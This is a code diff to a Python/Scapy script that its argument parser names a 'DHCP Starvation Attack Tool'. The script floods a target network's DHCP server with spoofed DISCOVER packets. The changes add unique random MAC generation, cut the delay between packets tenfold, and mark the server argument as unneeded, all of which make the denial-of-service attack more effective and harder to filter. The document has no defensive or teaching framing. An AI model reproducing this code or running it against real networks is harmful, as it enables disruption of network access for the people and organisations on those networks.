@@ -6,6 +6,20 @@ import threading
 import argparse
 import ipaddress
 
+used_macs = set()  # To keep track of used MAC addresses
+macs_lock = threading.Lock()  # Lock for thread-safe MAC generation 
+
+def generate_random_mac():  # Generates a 6 byte random MAC address
+    return ":".join([f"{randint(0x00, 0xff):02x}" for _ in range(6)])
+
+def generate_unique_mac():
+    while True:
+        mac = generate_random_mac()
+        with macs_lock:
+            if mac not in used_macs:
+                used_macs.add(mac)
+                return mac
+
 used_hostnames = set() 
 hostnames_lock = threading.Lock() 
 
@@ -18,8 +32,7 @@ def generate_unique_hostname():
                 used_hostnames.add(name)
                 return name
 
-def generate_random_mac():  # Generates a 6 byte random MAC address
-    return ":".join([f"{randint(0x00, 0xff):02x}" for _ in range(6)])
+
 
 def dhcp_starvation(interface, dhcp_server_ip, network_range, num_threads=5, duration=60):
     def starvation_thread():
@@ -69,7 +82,7 @@ def dhcp_starvation(interface, dhcp_server_ip, network_range, num_threads=5, dur
             
             # Send the packet
             sendp(dhcp_discover, iface=interface, verbose=0) # via Scapy
-            time.sleep(0.01)  # Small delay to avoid overwhelming the system
+            time.sleep(0.001)  # Small delay to avoid overwhelming the system
 
     # Threads to perform the DHCP starvation attack parallelly
     threads = []
@@ -85,7 +98,7 @@ def dhcp_starvation(interface, dhcp_server_ip, network_range, num_threads=5, dur
 if __name__ == "__main__":
     parser = argparse.ArgumentParser(description="DHCP Starvation Attack Tool")
     parser.add_argument("-i", "--interface", required=True, help="Network interface to use") # -i eth0
-    parser.add_argument("-s", "--server", required=True, help="Target DHCP server IP") # -s 192.168.1.1
+    parser.add_argument("-s", "--server", required=True, help="Target DHCP server IP") # -s 192.168.1.1; Not actually needed.
     parser.add_argument("-n", "--network", required=True, help="Network range to attack (e.g., 192.168.1.0/24)") # -n 192.168.1.0/24
     parser.add_argument("-t", "--threads", type=int, default=5, help="Number of threads to use") # -t 5 
     parser.add_argument("-d", "--duration", type=int, default=60, help="Attack duration in seconds") # -d 60
